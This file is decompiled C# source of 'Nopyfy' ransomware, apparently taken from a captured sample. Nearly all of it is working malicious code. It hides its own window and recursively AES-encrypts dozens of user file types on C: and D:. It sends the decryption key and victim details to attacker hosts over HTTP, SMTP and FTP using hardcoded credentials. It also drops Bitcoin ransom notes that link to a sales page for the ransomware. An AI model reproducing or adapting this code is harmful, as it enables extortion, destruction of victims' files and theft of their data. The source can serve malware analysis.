// Decompiled with JetBrains decompiler
// Type: Nopyfy_Ransomware.Form1
// Assembly: Nopyfy-Ransomware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FF2CCFD0-52E4-4DDF-B03E-81C14AB3E653
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Agent.gen-1505864873f9ce5eb449765dcf35f4cf6134956381e38b54abf20bb722f8299c.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Nopyfy_Ransomware
{
  public class Form1 : Form
  {
    private string userName = Environment.UserName;
    private string computerName = Environment.MachineName.ToString();
    private string userDir = "C:\\";
    private string userDir1 = "D:\\";
    private string extention = ".demo";
    private string nop_own_name = "HackerTBack";
    private string nop_own_email = "support@hackertback.com";
    private string nop_own_btc = "3GT1baitUWHLYDWNfuQdD64NuwKXHxmDex";
    private byte nop_byte = 100;
    private string backgroundImageUrl = "https://i.imgur.com/fXquzdX.jpeg";
    private string targetURL = "https://nopyfy-demo.000webhostapp.com/write.php";
    private string nop_smtp = "nopyfy-demo@hackertback.com";
    private string nop_smtp_from = "smtp.elasticemail.com";
    private string nop_smtp_to = "support@hackertback.com";
    private string nop_smtp_pass = "6BB55C33C864F9D32C232DE33ABD26DEC34A";
    private string nop_ftp = "ftp://ftp.hackertback.com/Victim_Data/";
    private string nop_ftp_user = "nopyfy-demo@hackertback.com";
    private string nop_ftp_pass = "@HackerTBack";
    private string nop_encryption_pass = "HackerTB";
    private IContainer components = (IContainer) null;

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      uint action,
      uint uParam,
      string vParam,
      uint winIni);

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.startAction();
    }

    protected override CreateParams CreateParams
    {
      get
      {
        CreateParams createParams = base.CreateParams;
        createParams.ExStyle |= 128;
        return createParams;
      }
    }

    private void Form_Shown(object sender, EventArgs e)
    {
      this.Visible = false;
      this.Opacity = 100.0;
    }

    public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] numArray = (byte[]) null;
      byte[] salt = new byte[12]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8,
        (byte) 9,
        (byte) 12,
        (byte) 15,
        this.nop_byte
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
      }
      return numArray;
    }

    public string CreatePassword(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()".Length)]);
      return stringBuilder.ToString();
    }

    public void SendPassword(string password)
    {
      try
      {
        string str1 = Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString();
        string str2 = "Computer Name - " + this.computerName + ", Username - " + this.userName + ", Password - " + password + "  , Ip Address - " + str1 + "  , Date/time - " + DateTime.Now.ToString("/Year/ - yyyy, /Month/ - MM, /Day/ - dd, /Hour/ - hh, /Minute/ - mm, /Second/ - ss");
        string str3 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        char[] chArray = new char[10];
        Random random = new Random();
        for (int index = 0; index < chArray.Length; ++index)
          chArray[index] = str3[random.Next(str3.Length)];
        string str4 = this.computerName + " File - " + new string(chArray);
        string str5 = this.userDir + this.userName + "\\Your_data\\" + str4 + ".bat";
        string str6 = this.userDir + this.userName + "\\Your_data\\Send_it.bat";
        string[] strArray = new string[1]{ str2 };
        string s1 = str2;
        string str7 = "";
        string nopEncryptionPass = this.nop_encryption_pass;
        string s2 = nopEncryptionPass;
        byte[] numArray1 = new byte[0];
        byte[] bytes1 = Encoding.UTF8.GetBytes(s2);
        byte[] numArray2 = new byte[0];
        byte[] bytes2 = Encoding.UTF8.GetBytes(nopEncryptionPass);
        byte[] bytes3 = Encoding.UTF8.GetBytes(s1);
        using (DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider())
        {
          MemoryStream memoryStream = new MemoryStream();
          CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, cryptoServiceProvider.CreateEncryptor(bytes2, bytes1), CryptoStreamMode.Write);
          cryptoStream.Write(bytes3, 0, bytes3.Length);
          cryptoStream.FlushFinalBlock();
          str7 = Convert.ToBase64String(memoryStream.ToArray());
        }
        string path = "Send_it.bat";
        string[] contents = new string[1]{ str7 };
        System.IO.File.WriteAllLines(path, contents);
        System.IO.File.WriteAllLines(str5, contents);
        try
        {
          new WebClient().DownloadString(this.targetURL + ("?computer_name=" + this.computerName + "&userName=" + this.userName + "&password=" + password + "&allow=ransom"));
        }
        catch (Exception ex)
        {
        }
        try
        {
          MailMessage message = new MailMessage();
          SmtpClient smtpClient = new SmtpClient(this.nop_smtp);
          message.From = new MailAddress(this.nop_smtp_from);
          message.To.Add(this.nop_smtp_to);
          message.Subject = "Client Data - " + str4;
          message.Body = str2;
          smtpClient.Port = 2525;
          smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.nop_smtp_from, this.nop_smtp_pass);
          smtpClient.Send(message);
        }
        catch (Exception ex)
        {
        }
        try
        {
          using (new WebClient())
            new WebClient()
            {
              Credentials = ((ICredentials) new NetworkCredential(this.nop_ftp_user, this.nop_ftp_pass))
            }.UploadFile(this.nop_ftp + str4 + ".txt", "STOR", str5);
        }
        catch (Exception ex)
        {
        }
      }
      catch (Exception ex)
      {
      }
    }

    public void EncryptFile(string file, string password)
    {
      byte[] bytesToBeEncrypted = System.IO.File.ReadAllBytes(file);
      byte[] bytes1 = Encoding.UTF8.GetBytes(password);
      byte[] hash = SHA256.Create().ComputeHash(bytes1);
      byte[] bytes2 = this.AES_Encrypt(bytesToBeEncrypted, hash);
      string path = this.userDir + ("Users\\" + this.userName + "\\Desktop\\READ_IT.txt" + this.extention);
      if (System.IO.File.Exists(path))
        System.IO.File.Delete(path);
      System.IO.File.WriteAllBytes(file, bytes2);
      System.IO.File.Move(file, file + this.extention);
    }

    public void encryptDirectory(string location, string password)
    {
      try
      {
        string[] source = new string[68]
        {
          ".txt",
          ".jar",
          ".exe",
          ".dat",
          ".contact",
          ".settings",
          ".doc",
          ".docx",
          ".xls",
          ".xlsx",
          ".ppt",
          ".pptx",
          ".odt",
          ".jpg",
          ".png",
          ".csv",
          ".py",
          ".sql",
          ".mdb",
          ".sln",
          ".php",
          ".asp",
          ".aspx",
          ".html",
          ".htm",
          ".xml",
          ".psd",
          ".pdf",
          ".dll",
          ".c",
          ".cs",
          ".mp3",
          ".mp4",
          ".f3d",
          ".dwg",
          ".cpp",
          ".zip",
          ".rar",
          ".mov",
          ".rtf",
          ".bmp",
          ".mkv",
          ".avi",
          ".apk",
          ".lnk",
          ".iso",
          ".7-zip",
          ".ace",
          ".arj",
          ".bz2",
          ".cab",
          ".gzip",
          ".lzh",
          ".tar",
          ".uue",
          ".xz",
          ".z",
          ".001",
          ".mpeg",
          ".mp3",
          ".mpg",
          ".core",
          ".crproj",
          ".pdb",
          ".ico",
          ".pas",
          ".db",
          ".torrent"
        };
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int index = 0; index < files.Length; ++index)
        {
          string extension = Path.GetExtension(files[index]);
          if (((IEnumerable<string>) source).Contains<string>(extension))
            this.EncryptFile(files[index], password);
        }
        for (int index = 0; index < directories.Length; ++index)
          this.encryptDirectory(directories[index], password);
      }
      catch (Exception ex)
      {
      }
    }

    public void MoveVirus()
    {
      string path1 = this.userDir + this.userName + "\\Ransomware";
      string path2 = this.userDir + this.userName + "\\Your_data";
      string str1 = this.userDir + this.userName + "\\Ransomware\\Virus.exe";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (!Directory.Exists(path2))
        Directory.CreateDirectory(path2).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
      else if (System.IO.File.Exists(str1))
        System.IO.File.Delete(str1);
      string str2 = "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
      System.IO.File.Move(Directory.GetCurrentDirectory() + str2, str1);
    }

    public static bool CheckForInternetConnection()
    {
      try
      {
        using (WebClient webClient = new WebClient())
        {
          using (webClient.OpenRead("https://www.google.com"))
            return true;
        }
      }
      catch
      {
        return false;
      }
    }

    public void startAction()
    {
      this.MoveVirus();
      string password = this.CreatePassword(10);
      this.Directory_Settings_Sending(password);
      this.messageCreator(password);
      this.SendPassword(password);
      string str = this.userDir + this.userName + "\\Ransomware\\Background_Dekstop.jpg";
      bool flag;
      do
      {
        flag = Form1.CheckForInternetConnection();
        if (flag)
        {
          this.SendPassword(password);
          new WebClient().DownloadFile(new Uri(this.backgroundImageUrl), str);
          this.SetWallpaper(str);
        }
      }
      while (!flag);
      Application.Exit();
    }

    public void Directory_Settings_Sending(string password)
    {
      string str = "Users\\";
      string location1 = this.userDir + str + this.userName + "\\Links";
      string location2 = this.userDir + str + this.userName + "\\Contacts";
      string location3 = this.userDir + str + this.userName + "\\Desktop";
      string location4 = this.userDir + str + this.userName + "\\Documents";
      string location5 = this.userDir + str + this.userName + "\\Downloads";
      string location6 = this.userDir + str + this.userName + "\\Pictures";
      string location7 = this.userDir + str + this.userName + "\\Music";
      string location8 = this.userDir + str + this.userName + "\\OneDrive";
      string location9 = this.userDir + str + this.userName + "\\Saved Games";
      string location10 = this.userDir + str + this.userName + "\\Favorites";
      string location11 = this.userDir + str + this.userName + "\\Searches";
      string location12 = this.userDir + str + this.userName + "\\Videos";
      string location13 = this.userDir1 + str + this.userName + "\\Links";
      string location14 = this.userDir1 + str + this.userName + "\\Contacts";
      string location15 = this.userDir1 + str + this.userName + "\\Desktop";
      string location16 = this.userDir1 + str + this.userName + "\\Documents";
      string location17 = this.userDir1 + str + this.userName + "\\Downloads";
      string location18 = this.userDir1 + str + this.userName + "\\Pictures";
      string location19 = this.userDir1 + str + this.userName + "\\Music";
      string location20 = this.userDir1 + str + this.userName + "\\OneDrive";
      string location21 = this.userDir1 + str + this.userName + "\\Saved Games";
      string location22 = this.userDir1 + str + this.userName + "\\Favorites";
      string location23 = this.userDir1 + str + this.userName + "\\Searches";
      string location24 = this.userDir1 + str + this.userName + "\\Videos";
      this.encryptDirectory(location1, password);
      this.encryptDirectory(location2, password);
      this.encryptDirectory(location3, password);
      this.encryptDirectory(location4, password);
      this.encryptDirectory(location5, password);
      this.encryptDirectory(location6, password);
      this.encryptDirectory(location7, password);
      this.encryptDirectory(location8, password);
      this.encryptDirectory(location9, password);
      this.encryptDirectory(location10, password);
      this.encryptDirectory(location11, password);
      this.encryptDirectory(location12, password);
      this.encryptDirectory(location13, password);
      this.encryptDirectory(location14, password);
      this.encryptDirectory(location15, password);
      this.encryptDirectory(location16, password);
      this.encryptDirectory(location17, password);
      this.encryptDirectory(location18, password);
      this.encryptDirectory(location19, password);
      this.encryptDirectory(location20, password);
      this.encryptDirectory(location21, password);
      this.encryptDirectory(location22, password);
      this.encryptDirectory(location23, password);
      this.encryptDirectory(location24, password);
    }

    public void messageCreator(string password)
    {
      string str1 = Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString();
      string s1 = "Computer Name - " + this.computerName + ", Username - " + this.userName + ", Id - " + password + "  , Ip Address - " + str1 + "  , Date/time - " + DateTime.Now.ToString("/Year/ - yyyy, /Month/ - MM, /Day/ - dd, /Hour/ - hh, /Minute/ - mm, /Second/ - ss");
      string str2 = "";
      string nopEncryptionPass = this.nop_encryption_pass;
      string s2 = nopEncryptionPass;
      byte[] numArray1 = new byte[0];
      byte[] bytes1 = Encoding.UTF8.GetBytes(s2);
      byte[] numArray2 = new byte[0];
      byte[] bytes2 = Encoding.UTF8.GetBytes(nopEncryptionPass);
      byte[] bytes3 = Encoding.UTF8.GetBytes(s1);
      using (DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider())
      {
        MemoryStream memoryStream = new MemoryStream();
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, cryptoServiceProvider.CreateEncryptor(bytes2, bytes1), CryptoStreamMode.Write);
        cryptoStream.Write(bytes3, 0, bytes3.Length);
        cryptoStream.FlushFinalBlock();
        str2 = Convert.ToBase64String(memoryStream.ToArray());
      }
      string str3 = "Users\\";
      string path1 = this.userDir + str3 + this.userName + "\\Links\\READ_IT.txt";
      string path2 = this.userDir + str3 + this.userName + "\\Contacts\\READ_IT.txt";
      string path3 = this.userDir + str3 + this.userName + "\\Documents\\READ_IT.txt";
      string path4 = this.userDir + str3 + this.userName + "\\Downloads\\READ_IT.txt";
      string path5 = this.userDir + str3 + this.userName + "\\Pictures\\READ_IT.txt";
      string path6 = this.userDir + str3 + this.userName + "\\Music\\READ_IT.txt";
      string path7 = this.userDir + str3 + this.userName + "\\OneDrive\\READ_IT.txt";
      string path8 = this.userDir + str3 + this.userName + "\\Saved Games\\READ_IT.txt";
      string path9 = this.userDir + str3 + this.userName + "\\Favorites\\READ_IT.txt";
      string path10 = this.userDir + str3 + this.userName + "\\Searches\\READ_IT.txt";
      string path11 = this.userDir + str3 + this.userName + "\\Videos\\READ_IT.txt";
      string path12 = this.userDir + "Users\\" + this.userName + "\\Desktop\\READ_IT.txt";
      string[] contents = new string[43]
      {
        "---------------------------------------------",
        "\uD835\uDC0D\uD835\uDC28\uD835\uDC29\uD835\uDC32\uD835\uDC1F\uD835\uDC32 \uD835\uDC11\uD835\uDC1A\uD835\uDC27\uD835\uDC2C\uD835\uDC28\uD835\uDC26\uD835\uDC30\uD835\uDC1A\uD835\uDC2B\uD835\uDC1E - \uD835\uDC05\uD835\uDC28\uD835\uDC2B \uD835\uDC03\uD835\uDC1E\uD835\uDC26\uD835\uDC28 \uD835\uDC0F\uD835\uDC2E\uD835\uDC2B\uD835\uDC29\uD835\uDC28\uD835\uDC2C\uD835\uDC1E \uD835\uDC0E\uD835\uDC27\uD835\uDC25\uD835\uDC32",
        "---------------------------------------------",
        "For any Help, Contact us - support@hackertback.com",
        "---------------------------------------------",
        "",
        "\uD835\uDE4D\uD835\uDE40\uD835\uDE3C\uD835\uDE3F_\uD835\uDE44\uD835\uDE4F.\uD835\uDE69\uD835\uDE6D\uD835\uDE69 \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6C\uD835\uDE5E\uD835\uDE61\uD835\uDE61 \uD835\uDE61\uD835\uDE64\uD835\uDE64\uD835\uDE60 \uD835\uDE61\uD835\uDE5E\uD835\uDE60\uD835\uDE5A \uD835\uDE69\uD835\uDE5D\uD835\uDE5E\uD835\uDE68:",
        "----------------------------------------------------------------------------------------------------------------------------------------------",
        "You Are Hacked....!",
        "ATTENTION!",
        "Don't worry, you can return all your files!",
        "All your files like pictures, databases, documents,aplications and other are encrypted with ",
        "strongest encryption and with unique key.",
        "The only method of recovering files is to purchase decryption software and his key for you. ",
        "This decryption software will dycrypt all your encrypted files and also your computer come in his good condition. ",
        "Price of decryption key and decrypt software is $800, but discount 50%($400) will apply, if you contact us within 1 days(24 hours).",
        "There is only one way to give us money, only Bitcoin.",
        "To pay in bitcoins, use the wallet address provided and then email us to receive your details.",
        "",
        "\uD835\uDDD5\uD835\uDDF6\uD835\uDE01\uD835\uDDF0\uD835\uDDFC\uD835\uDDF6\uD835\uDDFB \uD835\uDDEA\uD835\uDDEE\uD835\uDDF9\uD835\uDDF9\uD835\uDDF2\uD835\uDE01 \uD835\uDDD4\uD835\uDDF1\uD835\uDDF1\uD835\uDDFF\uD835\uDDF2\uD835\uDE00\uD835\uDE00 -",
        this.nop_own_btc,
        "Our Email - " + this.nop_own_email,
        "Copy This line and email us - ",
        this.computerName + " - " + this.userName,
        "",
        "️⚠️WARNING - CONTACT WITHIN 24 HOURS FOR PAYMENT OF ONLY $400, OTHERWISE YOU CHARGE $800 FOR DYCRYPTION KEY AND SOFTWARE",
        "We will reply to you, in some time, after the money is received and give you the decryption software link and decryption key on your replied email.",
        "NOTE - CONTACT AFTER PAYMENT AS YOU ONLY HAVE 24 HOURS FOR PAYMENT AND WE WILL REPLY WITHIN APPEARLY - 48 HOURS, SO FULLY YOUR PAYMENT IN TIME.",
        "\uD83D\uDED1⚠Caution - if You Change any encrypted file name (remove his .locked extention), then you won't be able to decrypt this file.",
        "Our Email for your contact",
        "- " + this.nop_own_email,
        "- " + this.nop_own_name + "_Team:)",
        "",
        "Your id (save it, its very important) - ",
        str2,
        "----------------------------------------------------------------------------------------------------------------------------------------------",
        "\uD835\uDE40\uD835\uDE63\uD835\uDE59",
        "",
        "---------------------------------------------",
        "Order this Ransomware from here - https://hackertback.sellix.io/product/6158e42f8792a",
        "---------------------------------------------",
        "\uD835\uDC0D\uD835\uDC28\uD835\uDC29\uD835\uDC32\uD835\uDC1F\uD835\uDC32 \uD835\uDC11\uD835\uDC1A\uD835\uDC27\uD835\uDC2C\uD835\uDC28\uD835\uDC26\uD835\uDC30\uD835\uDC1A\uD835\uDC2B\uD835\uDC1E - \uD835\uDC05\uD835\uDC28\uD835\uDC2B \uD835\uDC03\uD835\uDC1E\uD835\uDC26\uD835\uDC28 \uD835\uDC0F\uD835\uDC2E\uD835\uDC2B\uD835\uDC29\uD835\uDC28\uD835\uDC2C\uD835\uDC1E \uD835\uDC0E\uD835\uDC27\uD835\uDC25\uD835\uDC32",
        "---------------------------------------------"
      };
      System.IO.File.WriteAllLines(path12, contents);
      System.IO.File.WriteAllLines(path1, contents);
      System.IO.File.WriteAllLines(path2, contents);
      System.IO.File.WriteAllLines(path3, contents);
      System.IO.File.WriteAllLines(path4, contents);
      System.IO.File.WriteAllLines(path5, contents);
      System.IO.File.WriteAllLines(path6, contents);
      System.IO.File.WriteAllLines(path7, contents);
      System.IO.File.WriteAllLines(path8, contents);
      System.IO.File.WriteAllLines(path9, contents);
      System.IO.File.WriteAllLines(path10, contents);
      System.IO.File.WriteAllLines(path11, contents);
    }

    public void SetWallpaper(string path) => Form1.SystemParametersInfo(20U, 0U, path, 3U);

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(8f, 16f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(800, 450);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }

    private class encrypter
    {
    }
  }
}
